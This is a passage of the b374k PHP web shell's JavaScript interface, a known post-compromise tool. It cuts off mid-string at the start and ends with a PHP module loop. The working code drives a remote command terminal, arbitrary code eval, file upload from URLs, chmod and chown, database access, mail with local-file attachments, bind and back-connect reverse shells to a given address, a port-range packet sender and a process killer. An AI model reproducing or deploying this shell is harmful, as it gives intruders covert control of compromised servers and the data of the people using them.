onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";ulurl="<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";content=ulcomputer+'<br>'+ulurl+"<input type='hidden' class='ul_path' value='"+path+"'>";$('#explorer').html(content);ul_add_comp();ul_add_url();$('#ulDragNDrop').on('dragenter',function(e){e.stopPropagation();e.preventDefault()});$('#ulDragNDrop').on('dragover',function(e){e.stopPropagation();e.preventDefault()});$('#ulDragNDrop').on('drop',function(e){e.stopPropagation();e.preventDefault();files=e.target.files||e.dataTransfer.files;ulResult=$('.ulDragNDropResult');ulResult.html('');$.each(files,function(i){if(this){ulType='DragNDrop';filename=this.name;var formData=new FormData();formData.append('ulFile',this);formData.append('ulSaveTo',get_cwd());formData.append('ulFilename',filename);formData.append('ulType','comp');entry="<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";ulResult.append(entry);if(this.size<=0){$('.ulProgress'+ulType+i).html('( failed )');$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i)}else{ul_start(formData,ulType,i)}}})})}function ul_add_comp(path){path=html_safe($('.ul_path').val());$('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>")}function ul_add_url(path){path=html_safe($('.ul_path').val());$('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>")}function ul_start(formData,ulType,i){loading_start();$.ajax({url:targeturl,type:'POST',data:formData,cache:false,contentType:false,processData:false,xhr:function(){myXhr=$.ajaxSettings.xhr();if(myXhr.upload){myXhr.upload.addEventListener('progress',function(e){percent=Math.floor(e.loaded/e.total*100);$('.ulProgress'+ulType+i).html('( '+percent+'% )')},false)}return myXhr},success:function(res){if(res.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)){res='error'}if(res=='error'){$('.ulProgress'+ulType+i).html('( failed )')}else{$('.ulRes'+ulType+i).html(res)}loading_stop()},error:function(){loading_stop();$('.ulProgress'+ulType+i).html('( failed )');$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i)}})}function ul_go(ulType){ulFile=(ulType=='comp')?$('.ulFileComp'):$('.ulFileUrl');ulResult=(ulType=='comp')?$('.ulCompResult'):$('.ulUrlResult');ulResult.html('');ulFile.each(function(i){if(((ulType=='comp')&&this.files[0])||((ulType=='url')&&(this.value!=''))){file=(ulType=='comp')?this.files[0]:this.value;filename=(ulType=='comp')?file.name:file.substring(file.lastIndexOf('/')+1);ulSaveTo=(ulType=='comp')?$('.ulSaveToComp')[i].value:$('.ulSaveToUrl')[i].value;ulFilename=(ulType=='comp')?$('.ulFilenameComp')[i].value:$('.ulFilenameUrl')[i].value;var formData=new FormData();formData.append('ulFile',file);formData.append('ulSaveTo',ulSaveTo);formData.append('ulFilename',ulFilename);formData.append('ulType',ulType);entry="<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";ulResult.append(entry);check=true;if(ulType=='comp'){check=(file.size<=0)}else check=(file=="");if(check){$('.ulProgress'+ulType+i).html('( failed )');$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i)}else{ul_start(formData,ulType,i)}}})}function trap_ctrl_enter(el,e,callback){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){if(callback!=null)window[callback]()}fix_tabchar(el,e)}function edit_save_raw(){edit_save('edit')}function edit_save_hex(){edit_save('hex')}function edit_save(editType){editFilename=$('#editFilename').val();editInput=$('#editInput').val();editSuccess=false;preserveTimestamp='false';if($('.cBox').hasClass('cBoxSelected'))preserveTimestamp='true';send_post({editType:editType,editFilename:editFilename,editInput:editInput,preserveTimestamp:preserveTimestamp},function(res){if(res!='error'){editSuccess='success';view(editFilename,editType,preserveTimestamp)}else editSuccess='error'})}function mass_act(type){buffer=get_all_cbox_selected('xplTable','xpl_href');if((type=='cut')||(type=='copy')){localStorage.setItem('bufferLength',buffer.length);localStorage.setItem('bufferAction',type);$.each(buffer,function(i,v){localStorage.setItem('buffer_'+i,v)})}else if(type=='paste'){bufferLength=localStorage.getItem('bufferLength');bufferAction=localStorage.getItem('bufferAction');if(bufferLength>0){massBuffer='';for(var i=0;i<bufferLength;i++){if((buff=localStorage.getItem('buffer_'+i))){massBuffer+=buff+'\n'}}massBuffer=$.trim(massBuffer);if(bufferAction=='cut')title='move';else if(bufferAction=='copy')title='copy';content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";show_box(ucfirst(title),content)}}else if((type=='extract (tar)')||(type=='extract (tar.gz)')||(type=='extract (zip)')){if(type=='extract (tar)')arcType='untar';else if(type=='extract (tar.gz)')arcType='untargz';else if(type=='extract (zip)')arcType='unzip';if(buffer.length>0){massBuffer='';$.each(buffer,function(i,v){massBuffer+=v+'\n'});massBuffer=$.trim(massBuffer);title=type;content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";show_box(ucfirst(title),content)}}else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){date=new Date();rand=date.getTime();if(type=='compress (tar)'){arcType='tar';arcFilename=rand+'.tar'}else if(type=='compress (tar.gz)'){arcType='targz';arcFilename=rand+'.tar.gz'}else if(type=='compress (zip)'){arcType='zip';arcFilename=rand+'.zip'}if(buffer.length>0){massBuffer='';$.each(buffer,function(i,v){massBuffer+=v+'\n'});massBuffer=$.trim(massBuffer);title=type;content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";show_box(ucfirst(title),content)}}else if(type!=''){if(buffer.length>0){massBuffer='';$.each(buffer,function(i,v){massBuffer+=v+'\n'});massBuffer=$.trim(massBuffer);title=type;line='';if(type=='chmod')line="<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";else if(type=='chown')line="<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";else if(type=='touch'){var now=new Date();line="<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>"}content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";show_box(ucfirst(title),content)}}$('.cBoxSelected').removeClass('cBoxSelected');xpl_update_status()}function mass_act_go_tar(){mass_act_go('tar')}function mass_act_go_targz(){mass_act_go('targz')}function mass_act_go_zip(){mass_act_go('zip')}function mass_act_go_untar(){mass_act_go('untar')}function mass_act_go_untargz(){mass_act_go('untargz')}function mass_act_go_unzip(){mass_act_go('unzip')}function mass_act_go_paste(){mass_act_go('paste')}function mass_act_go_chmod(){mass_act_go('chmod')}function mass_act_go_chown(){mass_act_go('chown')}function mass_act_go_touch(){mass_act_go('touch')}function mass_act_go(massType){massBuffer=$.trim($('.massBuffer').val());massPath=get_cwd();massValue='';if(massType=='paste'){bufferLength=localStorage.getItem('bufferLength');bufferAction=localStorage.getItem('bufferAction');if(bufferLength>0){massBuffer='';for(var i=0;i<bufferLength;i++){if((buff=localStorage.getItem('buffer_'+i))){massBuffer+=buff+'\n'}}massBuffer=$.trim(massBuffer);if(bufferAction=='copy')massType='copy';else if(bufferAction=='cut')massType='cut'}}else if((massType=='chmod')||(massType=='chown')||(massType=='touch')){massValue=$('.massValue').val()}else if((massType=='tar')||(massType=='targz')||(massType=='zip')){massValue=$('.massValue').val()}else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')){massValue=$('.massValue').val()}if(massBuffer!=''){send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue},function(res){if(res!='error'){$('.boxresult').html(res+' Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed');navigate(get_cwd())})}}function xpl_update_status(){totalSelected=$('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;if(totalSelected==0)$('.xplSelected').html('');else $('.xplSelected').html(', '+totalSelected+' item(s) selected')}function xpl_bind(){$('.navigate').off('click');$('.navigate').on('click',function(e){path=xpl_href($(this));navigate(path);hide_box()});$('.navbar').off('click');$('.navbar').on('click',function(e){path=$(this).attr('data-path');navigate(path);hide_box()});$('.newfolder').off('click');$('.newfolder').on('click',function(e){path=html_safe(xpl_href($(this)));newfolder(path)});$('.newfile').off('click');$('.newfile').on('click',function(e){path=html_safe(xpl_href($(this)));newfile(path)});$('.del').off('click');$('.del').on('click',function(e){path=html_safe(xpl_href($(this)));del(path)});$('.view').off('click');$('.view').on('click',function(e){path=xpl_href($(this));view(path,'auto');hide_box()});$('.hex').off('click');$('.hex').on('click',function(e){path=xpl_href($(this));view(path,'hex')});$('#viewFullsize').off('click');$('#viewFullsize').on('click',function(e){src=$('#viewImage').attr('src');window.open(src)});$('.edit').off('click');$('.edit').on('click',function(e){path=xpl_href($(this));view(path,'edit');hide_box()});$('.ren').off('click');$('.ren').on('click',function(e){path=html_safe(xpl_href($(this)));ren(path)});$('.action').off('click');$('.action').on('click',function(e){path=html_safe(xpl_href($(this)));action(path,'file')});$('.actionfolder').off('click');$('.actionfolder').on('click',function(e){path=html_safe(xpl_href($(this)));action(path,'dir')});$('.actiondot').off('click');$('.actiondot').on('click',function(e){path=html_safe(xpl_href($(this)));action(path,'dot')});$('.dl').off('click');$('.dl').on('click',function(e){path=html_safe(xpl_href($(this)));$('#form').append("<input type='hidden' name='download' value='"+path+"'>");$('#form').submit();$('#form').html('');hide_box()});$('.ul').off('click');$('.ul').on('click',function(e){path=xpl_href($(this));navigate(path,false);path=html_safe(path);ul(path);hide_box()});$('.find').off('click');$('.find').on('click',function(e){path=xpl_href($(this));navigate(path,false);path=html_safe(path);find(path);hide_box()});$('#massAction').off('click');$('#massAction').on('change',function(e){type=$('#massAction').val();mass_act(type);$('#massAction').val('Action')});cbox_bind('xplTable','xpl_update_status')}function xpl_href(el){return el.parent().parent().attr('data-path')}function multimedia(path){var a=$('video').get(0);send_post({multimedia:path},function(res){a.src=res});hide_box()}$('#terminalInput').on('keydown',function(e){if(e.keyCode==13){cmd=$('#terminalInput').val();terminalHistory.push(cmd);terminalHistoryPos=terminalHistory.length;if(cmd=='clear'||cmd=='cls'){$('#terminalOutput').html('')}else if((path=cmd.match(/cd(.*)/i))||(path=cmd.match(/^([a-z]:)$/i))){path=$.trim(path[1]);navigate(path)}else if(cmd!=''){send_post({terminalInput:cmd},function(res){cwd=html_safe(get_cwd());res='<span class=\'strong\'>'+cwd+'&gt;</span>'+html_safe(cmd)+'\n'+res+'\n';$('#terminalOutput').append(res);bottom=$(document).height()-$(window).height();$(window).scrollTop(bottom)})}$('#terminalInput').val('');setTimeout("$('#terminalInput').focus()",100)}else if(e.keyCode==38){if(terminalHistoryPos>0){terminalHistoryPos--;$('#terminalInput').val(terminalHistory[terminalHistoryPos]);if(terminalHistoryPos<0)terminalHistoryPos=0}}else if(e.keyCode==40){if(terminalHistoryPos<terminalHistory.length-1){terminalHistoryPos++;$('#terminalInput').val(terminalHistory[terminalHistoryPos]);if(terminalHistoryPos>terminalHistory.length)terminalHistoryPos=terminalHistory.length}}fix_tabchar(this,e)});function eval_go(){evalType=$('#evalType').val();evalInput=$('#evalInput').val();evalOptions=$('#evalOptions').val();evalArguments=$('#evalArguments').val();if(evalOptions=='Options/Switches')evalOptions='';if(evalArguments=='Arguments')evalArguments='';if($.trim(evalInput)!=''){send_post({evalInput:evalInput,evalType:evalType,evalOptions:evalOptions,evalArguments:evalArguments},function(res){if(res!='error'){splits=res.split('{[|b374k|]}');if(splits.length==2){output=splits[0]+"<hr>"+splits[1];$('#evalOutput').html(output)}else{$('#evalOutput').html(res)}}})}}function eval_init(){if((evalSupported=localStorage.getItem('evalSupported'))){eval_bind();output("eval : "+evalSupported);evalReady=true}else{send_post({evalGetSupported:"evalGetSupported"},function(res){evalReady=true;if(res!="error"){localStorage.setItem('evalSupported',res);evalSupported=res;eval_bind();output("eval : "+evalSupported)}})}}function eval_bind(){if((evalSupported!=null)&&(evalSupported!='')){splits=evalSupported.split(",");$.each(splits,function(i,k){$('#evalType').append("<option>"+k+"</option>")})}$('#evalType').on('change',function(e){if($('#evalType').val()=='php'){$('#evalAdditional').hide()}else{$('#evalAdditional').show()}});$('#evalOptions').on('focus',function(e){options=$('#evalOptions');if(options.val()=='Options/Switches')options.val('')});$('#evalOptions').on('blur',function(e){options=$('#evalOptions');if($.trim(options.val())=='')options.val('Options/Switches')});$('#evalArguments').on('focus',function(e){args=$('#evalArguments');if(args.val()=='Arguments')args.val('')});$('#evalArguments').on('blur',function(e){args=$('#evalArguments');if($.trim(args.val())=='')args.val('Arguments')});$('#evalInput').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){eval_go()}fix_tabchar(this,e)})}Zepto(function($){$('#decodeStr').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){decode_go()}fix_tabchar(this,e)})});function decode_go(){decodeStr=$('#decodeStr').val();send_post({decodeStr:decodeStr},function(res){if(res!='error'){$('#decodeResult').html('');$('#decodeResult').html(res)}})}Zepto(function($){db_init()});var dbSupported="";var dbPageLimit=50;function db_init(){if((dbSupported=localStorage.getItem('db_supported'))){db_bind();output("db : "+dbSupported);db_add_supported()}else{send_post({dbGetSupported:""},function(res){if(res!="error"){localStorage.setItem('dbSupported',res);dbSupported=res;db_bind();output("db : "+dbSupported);db_add_supported()}})}}function db_add_supported(){splits=dbSupported.split(",");$.each(splits,function(i,k){$('#dbType').append("<option>"+k+"</option>")})}function db_bind(){$('#dbType').on('change',function(e){type=$('#dbType').val();if((type=='odbc')||(type=='pdo')){$('.dbHostLbl').html('DSN / Connection String');$('.dbUserRow').show();$('.dbPassRow').show();$('.dbPortRow').hide()}else if((type=='sqlite')||(type=='sqlite3')){$('.dbHostLbl').html('DB File');$('.dbUserRow').hide();$('.dbPassRow').hide();$('.dbPortRow').hide()}else{$('.dbHostLbl').html('Host');$('.dbUserRow').show();$('.dbPassRow').show();$('.dbPortRow').show()}});$('#dbQuery').on('focus',function(e){if($('#dbQuery').val()=='You can also press ctrl+enter to submit'){$('#dbQuery').val('')}});$('#dbQuery').on('blur',function(e){if($('#dbQuery').val()==''){$('#dbQuery').val('You can also press ctrl+enter to submit')}});$('#dbQuery').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){db_run()}})}function db_nav_bind(){dbType=$('#dbType').val();$('.boxNav').off('click');$('.boxNav').on('click',function(){$(this).next().toggle()});$('.dbTable').off('click');$('.dbTable').on('click',function(){type=$('#dbType').val();table=$(this).html();db=$(this).parent().parent().parent().prev().html();db_query_tbl(type,db,table,0,dbPageLimit)})}function db_connect(){dbType=$('#dbType').val();dbHost=$('#dbHost').val();dbUser=$('#dbUser').val();dbPass=$('#dbPass').val();dbPort=$('#dbPort').val();send_post({dbType:dbType,dbHost:dbHost,dbUser:dbUser,dbPass:dbPass,dbPort:dbPort},function(res){if(res!='error'){$('#dbNav').html(res);$('.dbHostRow').hide();$('.dbUserRow').hide();$('.dbPassRow').hide();$('.dbPortRow').hide();$('.dbConnectRow').hide();$('.dbQueryRow').show();$('#dbBottom').show();db_nav_bind()}else $('.dbError').html('Unable to connect')})}function db_disconnect(){$('.dbHostRow').show();$('.dbUserRow').show();$('.dbPassRow').show();$('.dbPortRow').show();$('.dbConnectRow').show();$('.dbQueryRow').hide();$('#dbNav').html('');$('#dbResult').html('');$('#dbBottom').hide()}function db_run(){dbType=$('#dbType').val();dbHost=$('#dbHost').val();dbUser=$('#dbUser').val();dbPass=$('#dbPass').val();dbPort=$('#dbPort').val();dbQuery=$('#dbQuery').val();if((dbQuery!='')&&(dbQuery!='You can also press ctrl+enter to submit')){send_post({dbType:dbType,dbHost:dbHost,dbUser:dbUser,dbPass:dbPass,dbPort:dbPort,dbQuery:dbQuery},function(res){if(res!='error'){$('#dbResult').html(res);$('.tblResult').each(function(){sorttable.k(this)})}})}}function db_query_tbl(type,db,table,start,limit){dbType=$('#dbType').val();dbHost=$('#dbHost').val();dbUser=$('#dbUser').val();dbPass=$('#dbPass').val();dbPort=$('#dbPort').val();send_post({dbType:dbType,dbHost:dbHost,dbUser:dbUser,dbPass:dbPass,dbPort:dbPort,dbQuery:'',dbDB:db,dbTable:table,dbStart:start,dbLimit:limit},function(res){if(res!='error'){$('#dbResult').html(res);$('.tblResult').each(function(){sorttable.k(this)})}})}function db_pagination(type){db=$('#dbDB').val();table=$('#dbTable').val();start=parseInt($('#dbStart').val());limit=parseInt($('#dbLimit').val());dbType=$('#dbType').val();if(type=='next'){start=start+limit}else if(type=='prev'){start=start-limit;if(start<0)start=0}db_query_tbl(dbType,db,table,start,limit)}Zepto(function($){info_init()});function info_init(){if((infoResult=localStorage.getItem('infoResult'))){$('.infoResult').html(infoResult)}else{info_refresh()}}function info_toggle(id){$('#'+id).toggle()}function info_refresh(){send_post({infoRefresh:'infoRefresh'},function(res){$('.infoResult').html(res);localStorage.setItem('infoResult',res)})}Zepto(function($){});function mail_send(){mailFrom=$.trim($('#mailFrom').val());mailTo=$.trim($('#mailTo').val());mailSubject=$.trim($('#mailSubject').val());mailContent=$('#mailContent').val();mailAttachment='';if($('.mailAttachment')){mailAttachment=$('.mailAttachment').map(function(){return this.value}).get().join('{[|b374k|]}')}send_post({mailFrom:mailFrom,mailTo:mailTo,mailSubject:mailSubject,mailContent:mailContent,mailAttachment:mailAttachment},function(res){$('#mailResult').html(res)})}function mail_attach(){content="<tr><td>Local file <a onclick=\"$(this).parent().parent().remove();\">(-)</a></td><td colspan='2'><input type='text' class='mailAttachment' value=''></td></tr>";$('#mailTBody').append(content)}Zepto(function($){rs_init()});function rs_init(){if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){splits=evalSupported.split(",");$.each(splits,function(i,k){$('.rsType').append("<option>"+k+"</option>")})}else setTimeout('rs_init()',1000);$('#packetContent').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){packet_go()}fix_tabchar(this,e)})}function rs_go_bind(){rs_go('bind')}function rs_go_back(){rs_go('back')}function rs_go(rsType){rsArgs="";if(rsType=='bind'){rsPort=parseInt($('#bindPort').val());rsLang=$('#bindLang').val();rsArgs=rsPort;rsResult=$('#bindResult')}else if(rsType=='back'){rsAddr=$('#backAddr').val();rsPort=parseInt($('#backPort').val());rsLang=$('#backLang').val();rsArgs=rsPort+' '+rsAddr;rsResult=$('#backResult')}if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){rsResult.html('Invalid port');return}if(rsArgs!=''){send_post({rsLang:rsLang,rsArgs:rsArgs},function(res){if(res!='error'){splits=res.split('{[|b374k|]}');if(splits.length==2){output=splits[0]+"<hr>"+splits[1];rsResult.html(output)}else{rsResult.html(res)}}})}}function packet_go(){packetHost=$('#packetHost').val();packetStartPort=parseInt($('#packetStartPort').val());packetEndPort=parseInt($('#packetEndPort').val());packetTimeout=parseInt($('#packetTimeout').val());packetSTimeout=parseInt($('#packetSTimeout').val());packetContent=$('#packetContent').val();packetResult=$('#packetResult');packetStatus=$('#packetStatus');if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){packetResult.html('Invalid start port');return}if((isNaN(packetEndPort))||(packetEndPort<=0)||(packetEndPort>65535)){packetResult.html('Invalid end port');return}if((isNaN(packetTimeout))||(packetTimeout<=0)){packetResult.html('Invalid connection timeout');return}if((isNaN(packetSTimeout))||(packetSTimeout<=0)){packetResult.html('Invalid stream timeout');return}if(packetStartPort>packetEndPort){start=packetEndPort;end=packetStartPort}else{start=packetStartPort;end=packetEndPort}packetResult.html('');while(start<=end){packetPort=start++;packetResult.append("<hr><div><p class='boxtitle'>Host : "+html_safe(packetHost)+":"+packetPort+"</p><br><div id='packet"+packetPort+"' style='padding:2px 4px;'>Working... please wait...</div></div>");packet_send(packetHost,packetPort,packetEndPort,packetTimeout,packetSTimeout,packetContent)}}function packet_send(packetHost,packetPort,packetEndPort,packetTimeout,packetSTimeout,packetContent){send_post({packetHost:packetHost,packetPort:packetPort,packetEndPort:packetEndPort,packetTimeout:packetTimeout,packetSTimeout:packetSTimeout,packetContent:packetContent},function(res){$('#packet'+packetPort).html(res)},false)}Zepto(function($){show_processes()});function show_processes(){send_post({showProcesses:''},function(res){if(res!='error'){$('#processes').html(res);sorttable.k($('#psTable').get(0));ps_bind()}})}function ps_bind(){$('.kill').off('click');$('.kill').on('click',function(e){kill_pid(ps_get_pid($(this)))});cbox_bind('psTable','ps_update_status')}function ps_get_pid(el){return el.parent().parent().attr('data-pid')}function ps_update_status(){totalSelected=$('#psTable').find('.cBoxSelected').not('.cBoxAll').length;if(totalSelected==0)$('.psSelected').html('');else $('.psSelected').html(' ( '+totalSelected+' item(s) selected )')}function kill_selected(){buffer=get_all_cbox_selected('psTable','ps_get_pid');allPid='';$.each(buffer,function(i,v){allPid+=v+' '});allPid=$.trim(allPid);kill_pid(allPid)}function kill_pid(allPid){title='Kill';content="<table class='boxtbl'><tr><td colspan='2'><textarea class='allPid' style='height:120px;min-height:120px;' disabled>"+allPid+"</textarea></td></tr><tr><td colspan='2'><span class='button' onclick=\"kill_pid_go();\">kill</span></td></tr></table>";show_box(title,content)}function kill_pid_go(){allPid=$('.allPid').val();if($.trim(allPid)!=''){send_post({allPid:allPid},function(res){if(res!='error'){$('.boxresult').html(res+' process(es) killed')}else $('.boxresult').html('Unable to kill process(es)');show_processes()})}}<?php
foreach($GLOBALS['module_to_load'] as $k){
echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";}?>
</script>
<!--script end-->
</body>
</html><?php die();
}
?>

